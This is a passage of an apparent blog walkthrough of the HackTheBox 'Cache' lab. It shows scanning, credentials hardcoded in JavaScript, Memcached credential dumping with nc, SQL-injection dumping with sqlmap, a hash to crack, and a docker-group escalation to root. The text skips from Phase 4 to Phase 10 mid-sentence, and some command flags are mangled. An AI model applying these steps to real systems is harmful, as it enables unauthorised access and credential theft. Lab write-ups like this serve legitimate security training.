Client-side code is ground truth. The server cannot hide what it sends to the browser. Always read source and JavaScript.<br>2. Anticipate virtual hosts. Modern web servers often host multiple applications behind different Host headers.<br>3. Fingerprint versions early. Knowing the exact software version turns blind fuzzing into targeted exploitation.<br>4. Side doors matter. Patient portals, APIs, and secondary interfaces often have weaker access control than the main admin panel.<br>5. Local services are soft targets. Memcached, Redis, and similar tools often ship without authentication.<br>6. Docker group equals root. If a user is in the docker group, you are usually one command away from a root shell.</p><h2 id="phase-1-initial-enumeration">Phase 1: Initial Enumeration</h2><p>We add the host entries first. This is a lab environment, so no public DNS resolves cache.htb or hms.htb for us.</p><p>echo "10.129.5.28 cache.htb hms.htb" | sudo tee -a /etc/hosts</p><p>Then we scan the target with the standard Nmap script and version combo:</p><p>nmap -sC -sV -T4 10.129.5.28</p><p>The output is clean and minimal:</p><p>PORT STATE SERVICE VERSION<br>22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)<br>80/tcp open http Apache httpd 2.4.29 ((Ubuntu))</p><p>Only SSH and HTTP. No SMB, no FTP, no high ports. The path in is almost certainly through the web application.</p><figure><img src="/writing/media/3a5dd51fe5d8e7796d08f58c.webp" alt="HackTheBox “Cache” Walkthrough, figure 2" width="1200" height="564" loading="lazy" decoding="async"></figure><h2 id="phase-2-web-discovery-on-cache-htb">Phase 2: Web Discovery on cache.htb</h2><p>We visit <a href="http://cache.htb/" rel="nofollow noopener noreferrer" target="_blank">http://cache.htb</a> and see a hacking-themed site with a login button. The rendered page does not give much away, so we look at the source and linked JavaScript files.</p><figure><img src="/writing/media/f73489c812e7945e02104061.webp" alt="HackTheBox “Cache” Walkthrough, figure 3" width="1200" height="691" loading="lazy" decoding="async"></figure><p>curl -s <a href="http://cache.htb/jquery/functionality.js" rel="nofollow noopener noreferrer" target="_blank">http://cache.htb/jquery/functionality.js</a></p><p>Inside, we find the login logic implemented entirely client-side:</p><p>function checkCorrectPassword(){<br>&nbsp;var Password = $("#password").val();<br>&nbsp;if(Password!= 'H@v3_fun'){<br>&nbsp;alert("Password didn't Match");<br>&nbsp;error_correctPassword = true;<br>&nbsp;}<br>}<br>function checkCorrectUsername(){<br>&nbsp;var Username = $("#username").val();<br>&nbsp;if(Username!= "ash"){<br>&nbsp;alert("Username didn't Match");<br>&nbsp;error_username = true;<br>&nbsp;}<br>}</p><p>The credentials are hardcoded: ash:H@v3_fun. Client-side authentication is not authentication. It is a suggestion at best.</p><figure><img src="/writing/media/72639dd1b89c597e59c78614.webp" alt="HackTheBox “Cache” Walkthrough, figure 4" width="1176" height="1396" loading="lazy" decoding="async"></figure><p>After logging in, the site shows an under construction page. Manual browsing leads us to:</p><p><a href="http://cache.htb/author.html" rel="nofollow noopener noreferrer" target="_blank">http://cache.htb/author.html</a></p><p>ASH's bio mentions another project: Cache HMS (Hospital Management System). This is our breadcrumb to a second application.</p><figure><img src="/writing/media/9422449c8c8c9a66459025aa.webp" alt="HackTheBox “Cache” Walkthrough, figure 5" width="1200" height="876" loading="lazy" decoding="async"></figure><p>And the below is the cache.htb/author.</p><figure><img src="/writing/media/895032f104647555b8b2b944.webp" alt="HackTheBox “Cache” Walkthrough, figure 6" width="1200" height="1131" loading="lazy" decoding="async"></figure><h2 id="phase-3-virtual-host-discovery-hms-htb">Phase 3: Virtual Host Discovery (hms.htb)</h2><p>Because we already added hms.htb to /etc/hosts, we visit it directly.</p><p><a href="http://hms.htb/" rel="nofollow noopener noreferrer" target="_blank">http://hms.htb</a></p><figure><img src="/writing/media/e1ef0931c1b23278193b6685.webp" alt="HackTheBox “Cache” Walkthrough, figure 7" width="1200" height="864" loading="lazy" decoding="async"></figure><p>It redirects to an OpenEMR login page:</p><p><a href="http://hms.htb/interface/login/login.php?site=default" rel="nofollow noopener noreferrer" target="_blank">http://hms.htb/interface/login/login.php?site=default</a></p><p>OpenEMR is a large, complex PHP health records application. Identifying the exact product immediately tells us to hunt for version-specific CVEs.</p><h2 id="phase-4-openemr-enumeration-and-version-identification">Phase 4: OpenEMR Enumeration &amp; Version Identification</h2><p>We fingerprint the version by checking admin.php and the login page footer, which references 2018. Password reuse is human nature.</p><p>su ash<br>cd ~<br>cat user.txt</p><figure><img src="/writing/media/cc02a6829138db5b87ef74d9.webp" alt="HackTheBox “Cache” Walkthrough, figure 16" width="1026" height="330" loading="lazy" decoding="async"></figure><h2 id="phase-10-privilege-escalation-enumeration">Phase 10: Privilege Escalation Enumeration</h2><p>We check local services and spot something interesting:</p><p>netstat -antp | grep 11211</p><p>tcp 0 0 127.0.0.1:11211 0.0.0.0:* LISTEN -</p><p>Port 11211 is Memcached. Given the box name is Cache, this is clearly part of the privilege escalation chain. Memcached stores key-value pairs in RAM and typically ships with no authentication.</p><figure><img src="/writing/media/8e0a83127878903fd1110d8e.webp" alt="HackTheBox “Cache” Walkthrough, figure 17" width="1200" height="214" loading="lazy" decoding="async"></figure><h2 id="phase-11-memcached-credential-harvesting">Phase 11: Memcached Credential Harvesting</h2><p>We dump the cached keys from slab 1:</p><p>echo "stats cachedump 1 0" | nc -q 1 127.0.0.1 11211</p><p>Output:</p><p>ITEM link [21 b; 0 s]<br>ITEM user [5 b; 0 s]<br>ITEM passwd [9 b; 0 s]<br>ITEM file [7 b; 0 s]<br>ITEM account [9 b; 0 s]<br>END</p><figure><img src="/writing/media/000f885414c1f24288adf2de.webp" alt="HackTheBox “Cache” Walkthrough, figure 18" width="1200" height="226" loading="lazy" decoding="async"></figure><p>The keys are literally named user and passwd. We retrieve them:</p><p>echo "get user" | nc -q 1 127.0.0.1 11211<br>echo "get passwd" | nc -q 1 127.0.0.1 11211<br>echo "get account" | nc -q 1 127.0.0.1 11211</p><p>Output:</p><p>VALUE user 0 5<br>luffy<br>END</p><p>VALUE passwd 0 9<br>0n3_p1ec3<br>END</p><p>VALUE account 0 9<br>afhj556uo<br>END</p><p>New credentials: luffy:0n3_p1ec3</p><figure><img src="/writing/media/0215922c65ddaeb4ef1d18aa.webp" alt="HackTheBox “Cache” Walkthrough, figure 19" width="1200" height="411" loading="lazy" decoding="async"></figure><h2 id="phase-12-docker-group-privilege-escalation-to-root">Phase 12: Docker Group Privilege Escalation to Root</h2><p>We switch to luffy:</p><p>su luffy<br>id</p><p>Output:</p><p>uid=1001(luffy) gid=1001(luffy) groups=1001(luffy),999(docker)</p><figure><img src="/writing/media/875c214fb06dad1a547f37e7.webp" alt="HackTheBox “Cache” Walkthrough, figure 20" width="958" height="264" loading="lazy" decoding="async"></figure><p>luffy is in the docker group. On most Linux systems, that is root-equivalent. We check available images:</p><p>docker images</p><p>Output:</p><p>REPOSITORY TAG IMAGE ID CREATED SIZE<br>ubuntu latest 2ca708c1c9cc 6 years ago 64.2MB</p><figure><img src="/writing/media/915ce7513244ee8c436b222f.webp" alt="HackTheBox “Cache” Walkthrough, figure 21" width="1200" height="132" loading="lazy" decoding="async"></figure><p>There is no internet to pull alpine, but ubuntu is cached locally. We adapt the classic payload:</p><p>docker run -v /:/mnt - rm -it ubuntu chroot /mnt sh</p><p>Breakdown:<br>- docker run: create and start a container<br>- -v /:/mnt: mount the host's root filesystem to /mnt inside the container<br>- - rm: delete the container on exit<br>- -it: interactive terminal<br>- ubuntu: use the locally cached Ubuntu image<br>- chroot /mnt sh: change root to the mounted host filesystem and run a shell</p><p>Result:</p><p># id<br>uid=0(root) gid=0(root) groups=0(root)</p><p># cat /root/root.txt</p><figure><img src="/writing/media/e78901f0665b3da2f52d5d84.webp" alt="HackTheBox “Cache” Walkthrough, figure 22" width="1200" height="222" loading="lazy" decoding="async"></figure><h2 id="review-notes">Review notes</h2><p>1. Client-side validation is not validation. Credentials in JavaScript are free wins.<br>2. Virtual hosts hide entire applications. Always check for subdomains and vhosts.<br>3. Version fingerprinting saves time. Knowing the exact software version lets you find targeted exploits immediately.<br>4. Side doors matter. The patient portal had weaker security than the main admin panel.<br>5. Sqlmap is your friend. Don't hand-craft UNION queries when a tool can do it perfectly.<br>6. Password reuse is human nature. Test every credential everywhere.<br>7. Local services are soft targets. Memcached, Redis, and similar services often lack authentication.<br>8. The docker group is root. Always check groups output. If you see docker, you are probably one command away from root.</p><h2 id="commands-cheatsheet">Commands Cheatsheet</h2><p>Host entries:<br>echo "10.129.5.28 cache.htb hms.htb" | sudo tee -a /etc/hosts</p><p>Port scan:<br>nmap -sC -sV -T4 10.129.5.28</p><p>Find hardcoded creds:<br>curl -s <a href="http://cache.htb/jquery/functionality.js" rel="nofollow noopener noreferrer" target="_blank">http://cache.htb/jquery/functionality.js</a></p><p>Discover HMS vhost:<br><a href="http://hms.htb/interface/login/login.php?site=default" rel="nofollow noopener noreferrer" target="_blank">http://hms.htb/interface/login/login.php?site=default</a></p><p>OpenEMR version fingerprint:<br>curl -s <a href="http://hms.htb/admin.php" rel="nofollow noopener noreferrer" target="_blank">http://hms.htb/admin.php</a> | grep -i "version\|openemr"</p><p>Search exploits:<br>searchsploit openemr</p><p>Patient portal auth bypass:<br><a href="http://hms.htb/portal/add_edit_event_user.php?eid=1" rel="nofollow noopener noreferrer" target="_blank">http://hms.htb/portal/add_edit_event_user.php?eid=1</a></p><p>SQL injection confirmation:<br><a href="http://hms.htb/portal/add_edit_event_user.php?eid=1%27" rel="nofollow noopener noreferrer" target="_blank">http://hms.htb/portal/add_edit_event_user.php?eid=1'</a></p><p>sqlmap dump:<br>curl -s -c cookies.txt -b cookies.txt "<a href="http://hms.htb/portal/account/register.php" rel="nofollow noopener noreferrer" target="_blank">http://hms.htb/portal/account/register.php</a>"<br># build openemr.req with cookie header<br>sqlmap -r openemr.req -D openemr -T users_secure - dump - batch</p><p>Hash cracking:<br>echo '$2a$05$l2sTLIG6GTBeyBf7TAKL6.ttEwJDmxs9bI6LXqlfCpEcY6VF6P0B.' &gt;
